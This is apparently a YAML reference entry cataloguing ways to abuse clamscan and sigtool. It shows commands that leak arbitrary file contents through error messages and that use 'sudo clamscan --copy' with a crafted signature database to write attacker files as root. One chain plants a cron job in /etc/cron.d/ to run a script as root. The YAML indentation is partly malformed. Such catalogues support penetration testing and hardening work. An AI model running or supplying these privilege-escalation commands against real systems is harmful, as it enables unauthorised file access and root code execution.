---
functions:
  file-read:
  - binary: false
    code: |-
      touch x.yara
      clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
    comment: |-
      Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.
    contexts:
      sudo:
      suid:
      unprivileged:

file-write:
  - code: |-
      sigtool --md5 /path/to/input-file > /path/to/custom_db.hdb
      sudo clamscan /path/to/input-file -d /path/to/custom_db.hdb --copy=/path/to/output-file
    contexts:
      sudo:
- code: |-
      printf "SHELL=/bin/sh\n\n* * * * *   root	/tmp/script.sh" > /tmp/fake_cron
      echo 'id > /tmp/out.txt' > /tmp/script.sh && chmod +x /tmp/script.sh
      sigtool --md5 /tmp/fake_cron > /tmp/custom_db.hdb
      sudo clamscan /tmp/fake_cron -d /tmp/custom_db.hdb --copy=/etc/cron.d/

    comment: |-
      By crafting a custom signature database that intentionally flags an attacker‑controlled file as malicious, clamscan can be abused to write arbitrary data as root to attacker‑chosen directories, provided the target filename does not already exist.
      The example below demonstrates how this arbitrary file write primitive can be leveraged to achieve arbitrary code execution.
    contexts:
      sudo:
      
    
...
